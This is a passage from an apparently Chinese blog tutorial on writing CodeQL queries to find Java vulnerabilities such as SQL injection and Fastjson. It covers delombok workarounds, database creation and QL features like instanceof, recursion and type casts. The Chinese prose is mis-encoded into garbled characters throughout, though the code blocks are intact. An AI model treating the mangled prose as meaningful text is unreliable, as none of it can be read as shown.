&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="Lombok-æ’ä»¶æ¼æŠ¥"><a href="#Lombok-æ’ä»¶æ¼æŠ¥" class="headerlink" title="Lombok æ’ä»¶æ¼æŠ¥"></a>Lombok æ’ä»¶æ¼æŠ¥</h3><p>Lombok çš„æ³¨è§£å¹¶ä¸ä¼šç›´æ¥è¢« CodeQL æ‰€è§£æï¼Œå¯¼è‡´å…¶ä¸­çš„ä¸­é—´é“¾è·¯ä¼šâ€œä¸­é“å´©æ®‚â€ï¼Œæˆ‘ä»¬ç”¨ä»¥ä¸‹æ–¹æ³•æ¥è§£å†³ã€‚</p><h4 id="è§£å†³æ–¹æ³•-â‘ "><a href="#è§£å†³æ–¹æ³•-â‘ " class="headerlink" title="è§£å†³æ–¹æ³• â‘ "></a>è§£å†³æ–¹æ³• â‘ </h4><p>ä½¿ç”¨ <code>maven-delombok</code>ï¼Œåœ¨ <code>pom.xml</code> ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œé‡æ–°ç¼–è¯‘å³å¯ã€‚ï¼ˆæ¨èï¼‰</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>target/generated-sources/delombok<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>target/generated-test-sources/delombok<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>test-delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-test-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testDelombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/test/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><h4 id="è§£å†³åŠæ³•-â‘¡"><a href="#è§£å†³åŠæ³•-â‘¡" class="headerlink" title="è§£å†³åŠæ³• â‘¡"></a>è§£å†³åŠæ³• â‘¡</h4><p>CodeQLå®˜æ–¹çš„issueé‡Œé¢ï¼Œæœ‰äººç»™å‡ºäº†è¿™ä¸ªé—®é¢˜çš„è§£å†³åŠæ³• <a class="link" href="https://github.com/github/codeql/issues/4984">https://github.com/github/codeql/issues/4984<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get a copy of lombok.jar</span></span><br><span class="line">wget https://projectlombok.org/downloads/lombok.jar -O <span class="string">&quot;lombok.jar&quot;</span></span><br><span class="line"><span class="comment"># run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"><span class="comment"># remove &quot;generated by&quot; comments</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># remove any left-over import statements</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># copy delombok&#x27;d files over the original ones</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="string">&quot;delombok/.&quot;</span> <span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="comment"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ç‰¹åˆ«æ˜ç™½è¿™ä¸ªåº”è¯¥åœ¨å“ªä¸ªç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä¸Šé¢çš„ä»£ç ï¼Œå®ç°çš„åŠŸèƒ½æ˜¯ï¼šå»æ‰ä»£ç é‡Œçš„lombokæ³¨è§£ï¼Œå¹¶è¿˜åŸsetterå’Œgetteræ–¹æ³•çš„javaä»£ç ï¼Œä»è€Œä½¿CodeQLçš„Flowæµèƒ½å¤Ÿé¡ºåˆ©èµ°ä¸‹å»ï¼Œ<br>ä»è€Œæ£€ç´¢åˆ°å®‰å…¨æ¼æ´ã€‚</p><h3 id="æŒç»­å·¥ç¨‹åŒ–"><a href="#æŒç»­å·¥ç¨‹åŒ–" class="headerlink" title="æŒç»­å·¥ç¨‹åŒ–"></a>æŒç»­å·¥ç¨‹åŒ–</h3><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬ç¼–å†™äº†SQLæ³¨å…¥çš„æŸ¥è¯¢è¯­å¥ï¼Œæ¶ˆé™¤äº†è¯¯æŠ¥å’Œæ¼æŠ¥é—®é¢˜ã€‚å½“å‰çš„è§„åˆ™å·²ç»èƒ½å¤Ÿé€‚åº”micro-service-seclabé¡¹ç›®å•¦ã€‚</p><p>å› ä¸ºæˆ‘ä»¬çš„micro-service-seclabé¡¹ç›®ï¼Œæ˜¯æŒ‰ç…§æ ‡å‡†ç”Ÿæˆçš„å¾®æœåŠ¡ç»“æ„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªqlè§„åˆ™å»è·‘å…¶ä»–çš„é¡¹ç›®ï¼Œæ¥è‡ªåŠ¨åŒ–æ£€æµ‹å…¶å®ƒé¡¹ç›®ï¼Œä»è€Œåšåˆ°è‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œæé«˜å®‰å…¨æ£€æµ‹æ•ˆç‡ã€‚</p><p>CodeQLé™¤äº†æä¾›VSCodeçš„æ£€æµ‹æ’ä»¶ï¼Œä¹Ÿæä¾›äº†å¤§é‡çš„å‘½ä»¤è¡Œï¼Œæ¥å®ç°é¡¹ç›®çš„é›†æˆæ£€æµ‹ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice\database --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ä¸Šé¢è¯­å¥è‡ªåŠ¨ç”Ÿæˆ codeql çš„ä¸­é—´æ•°æ®åº“(database)</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><p>è¿™é‡Œæ˜¯å¾ˆå®¹æ˜“è¸©å‘çš„ï¼Œå› ä¸ºå‰é¢çš„è¯­å¥æœ‰ä¸ªé—®é¢˜å°±æ˜¯ select çš„è¿”å›å€¼å¹¶éæ˜¯ stringï¼Œæ‰€ä»¥å°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error was: Expected result pattern(s) are not present <span class="keyword">for</span> problem query: Expected exactly one pattern. </span><br></pre></td></tr></table></figure><p>å‚è€ƒ <a class="link" href="https://xz.aliyun.com/t/10852#toc-7">https://xz.aliyun.com/t/10852#toc-7<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x04-CodeQL-è¿›é˜¶"><a href="#0x04-CodeQL-è¿›é˜¶" class="headerlink" title="0x04 CodeQL è¿›é˜¶"></a>0x04 CodeQL è¿›é˜¶</h2><h3 id="ç”¨-instanceof-æ›¿ä»£å¤æ‚æŸ¥è¯¢è¯­å¥é—®é¢˜"><a href="#ç”¨-instanceof-æ›¿ä»£å¤æ‚æŸ¥è¯¢è¯­å¥é—®é¢˜" class="headerlink" title="ç”¨ instanceof æ›¿ä»£å¤æ‚æŸ¥è¯¢è¯­å¥é—®é¢˜"></a>ç”¨ instanceof æ›¿ä»£å¤æ‚æŸ¥è¯¢è¯­å¥é—®é¢˜</h3><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„æ¡ˆä¾‹å½“ä¸­çœ‹åˆ°äº† <code>instanceof</code>, å¦‚æœæˆ‘ä»¬å»çœ‹qlè‡ªå¸¦çš„è§„åˆ™åº“ï¼Œä¼šå‘ç°å¤§é‡çš„ <code>instanceof</code> è¯­å¥ã€‚</p><p><code>instanceof</code> è¿™ä¸ªå…³é”®å­—æ˜¯ç”¨æ¥åˆ¤æ–­å½“å‰çš„å¯¹è±¡ï¼Œå’Œåé¢çš„æ˜¯å¦ä¸ºåŒä¸€ç±»å‹ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/instanceof.png" class><p><code>instanceof</code> æ˜¯ç”¨æ¥ä¼˜åŒ–ä»£ç ç»“æ„éå¸¸å¥½çš„è¯­æ³•ç³–ã€‚</p><p>è¿™ç§æ–¹å¼çš„æå‡ºå…¶å®æ˜¯ç”¨æ¥ä¼˜åŒ–ä¹‹å‰ä½¿ç”¨ <code>exists(|)</code> åŒ¹é…å¯¹åº” Source&#x2F;Sinkï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å†™éå¸¸å¤šçš„ <code>exists(|)</code>ï¼Œè¿™ä¼šä½¿å¾—æ•´ä¸ªé¡¹ç›®ç»´æŠ¤èµ·æ¥éå¸¸å›°éš¾ï¼Œäºæ˜¯å°±å‡ºç°äº†è¿™ä¸€ç§è¯­æ³•ç³– <code>instanceof</code></p><p><code>instanceof</code> ç»™æˆ‘ä»¬æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œæˆ‘ä»¬åªéœ€è¦å®šä¹‰ä¸€ä¸ª <code>abstract class</code>ï¼Œæ¯”å¦‚è¿™ä¸ªæ¡ˆä¾‹å½“ä¸­çš„ <strong>RemoteFlowSource</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow source of remote user input. */</span><br><span class="line">abstract class RemoteFlowSource extends DataFlow::Node &#123;</span><br><span class="line">  /** Gets a string that describes the type of this remote flow source. */</span><br><span class="line">  abstract string getSourceType();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>isSource</code> æ–¹æ³•é‡Œè¿›è¡Œ <code>instanceof</code>ï¼Œåˆ¤æ–­ src æ˜¯ RemoteFlowSource ç±»å‹å°±å¯ä»¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å­¦è¿‡ java çš„äººå¯èƒ½ä¼šå¾ˆè´¹è§£ï¼Œæˆ‘ä»¬ç»§æ‰¿äº†ä¸€ä¸ª abstract æŠ½è±¡ç±»ï¼Œè¿ä¸ªå®ç°æ–¹æ³•éƒ½æ²¡æœ‰ï¼Œæ€ä¹ˆå°±èƒ½å¤Ÿè¾¾åˆ°è·å–å„ç§ source çš„ç›®çš„å‘¢ï¼Ÿ</p><p>CodeQL å’Œ Java ä¸å¤ªä¸€æ ·ï¼Œåªè¦æˆ‘ä»¬çš„å­ç±»ç»§æ‰¿äº†è¿™ä¸ª RemoteFlowSource ç±»ï¼Œé‚£ä¹ˆæ‰€æœ‰å­ç±»å°±ä¼šè¢«è°ƒç”¨ï¼Œå®ƒæ‰€ä»£è¡¨çš„ source ä¹Ÿä¼šè¢«åŠ è½½ï¼ˆè®©æˆ‘æƒ³èµ·äº†è¶…çº§ç‰ˆ Fastjsonï¼Œè¿™æœ‰æ²¡æœ‰å­˜åœ¨ CodeQL ååˆ¶ä¸€è¯´</p><p>æˆ‘ä»¬åœ¨ RemoteFlowSource å®šä¹‰ä¸‹é¢ä¼šçœ‹åˆ°éå¸¸å¤šå­ç±»ï¼Œå°±æ˜¯è¿™ä¸ªé“ç†ï¼Œå®ƒä»¬çš„ç»“æœéƒ½ä¼šè¢«ç”¨ and ä¸²è”åŠ è½½ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/autoUsed.png" class><h3 id="é€’å½’é—®é¢˜"><a href="#é€’å½’é—®é¢˜" class="headerlink" title="é€’å½’é—®é¢˜"></a>é€’å½’é—®é¢˜</h3><p>ç®€å•æ¥è¯´ï¼Œæœ‰å¦‚æ­¤ä¸€æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³è¦æ ¹æ® <code>innerTwo</code> ç±»å®šä½åˆ°æœ€å¤–å±‚çš„ <code>StudentService</code> ç±»ï¼Œæ€ä¹ˆå®ç°ï¼Ÿ</p><p>æŒ‰ç…§éé€’å½’çš„å†™æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType() // getEnclosingType è·å–ä½œç”¨åŸŸ</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡è¿ç»­ 2 æ¬¡è°ƒç”¨ <code>getEnclosingType()</code> æ–¹æ³•æ˜¯èƒ½å¤Ÿæ‹¿åˆ°æœ€å¤–å±‚çš„ StudentService çš„ã€‚</p><p>ä½†æ˜¯æ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œå®é™…æƒ…å†µæ˜¯æˆ‘ä»¬å¹¶ä¸æ¸…æ¥šä¸€å…±æœ‰å¤šå°‘å±‚åµŒå¥—ï¼Œè€Œä¸”å¤šä¸ªæ–‡ä»¶å¯èƒ½æ¯ä¸ªçš„åµŒå¥—æ•°é‡éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬æ²¡æ³•ç”¨ç¡®å®šçš„è°ƒç”¨æ¬¡æ•°æ¥è§£å†³æ­¤é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨é€’å½’çš„æ–¹å¼è§£å†³ã€‚</p><p>æˆ‘ä»¬åœ¨è°ƒç”¨æ–¹æ³•åé¢åŠ  <code>*</code> (ä»æœ¬èº«å¼€å§‹è°ƒç”¨)æˆ–è€… <code>+</code> (ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨)ï¼Œæ¥è§£å†³æ­¤é—®é¢˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+() // getEnclosingType è·å–ä½œç”¨åŸŸ</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±å°è£…æ–¹æ³•æ¥é€’å½’è°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SelfDefineRecursion.png" class><h3 id="å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼ˆè¿‡æ»¤éœ€è¦ç±»å‹ï¼‰"><a href="#å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼ˆè¿‡æ»¤éœ€è¦ç±»å‹ï¼‰" class="headerlink" title="å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼ˆè¿‡æ»¤éœ€è¦ç±»å‹ï¼‰"></a>å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼ˆè¿‡æ»¤éœ€è¦ç±»å‹ï¼‰</h3><p>å¼ºåˆ¶ç±»å‹è½¬æ¢è¿™ä¸ªåå­—æœ‰ç‚¹æ‹—å£ï¼Œä¸”ä¸å¤ªå¥½ç†è§£ï¼Œè¿™é‡Œæˆ‘æ›´æ„¿æ„æŠŠå®ƒç†è§£æˆä¸€ç§ filter</p><p>åœ¨ CodeQL çš„è§„åˆ™é›†é‡Œï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å¾ˆå¤šç±»å‹è½¬æ¢çš„ä»£ç ï¼Œæ¯”å¦‚ï¼š</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefType.png" class><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹ QL è¯­å¥åšä¸ªæµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç çš„å«ä¹‰æ˜¯æ‰“å°æ‰€æœ‰æ–¹æ³•å‚æ•°çš„åç§°å’Œç±»å‹ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getTypes.png" class><p>å¦‚æœå…¶ä¸­æˆ‘ä»¬æƒ³è¦å•ç‹¬æŸä¸ªç±»å‹çš„æ–¹æ³•å‚æ•°ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæˆ–è€…è¯´ç”¨åˆ° filter</p><p>ä½¿ç”¨ <code>RefType()</code> æ¥æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>å¼ºåˆ¶è½¬æ¢æˆ <code>RefType</code>ï¼Œæ„æ€å°±æ˜¯ä»å‰é¢çš„ç»“æœå½“ä¸­è¿‡æ»¤å‡º <code>RefType</code> ç±»å‹çš„å‚æ•°ã€‚</p><p><code>RefType</code> æ˜¯ä»€ä¹ˆï¼Ÿå¼•ç”¨ç±»å‹ï¼Œè¯´ç™½äº†å°±æ˜¯å»æ‰intç­‰åŸºç¡€ç±»å‹ä¹‹åçš„æ•°æ®ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefTypeUse.png" class><p>åŒç†è¿™é‡Œè‚¯å®šå¹¶ä¸é™äº RefTypeï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ã€‚æ¯”å¦‚è¿™é‡Œä¿ç•™æ‰€æœ‰çš„æ•°å€¼ç±»å‹å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/IntType.png" class><h2 id="0x05-å…³äºå…¶ä»–æ¼æ´ç‚¹çš„-CodeQL-è¯­å¥å°è¯•"><a href="#0x05-å…³äºå…¶ä»–æ¼æ´ç‚¹çš„-CodeQL-è¯­å¥å°è¯•" class="headerlink" title="0x05 å…³äºå…¶ä»–æ¼æ´ç‚¹çš„ CodeQL è¯­å¥å°è¯•"></a>0x05 å…³äºå…¶ä»–æ¼æ´ç‚¹çš„ CodeQL è¯­å¥å°è¯•</h2><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>ä¾æ ·ç”»è‘«èŠ¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name fastjson-vul</span><br><span class="line"> * @description fastjson-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class 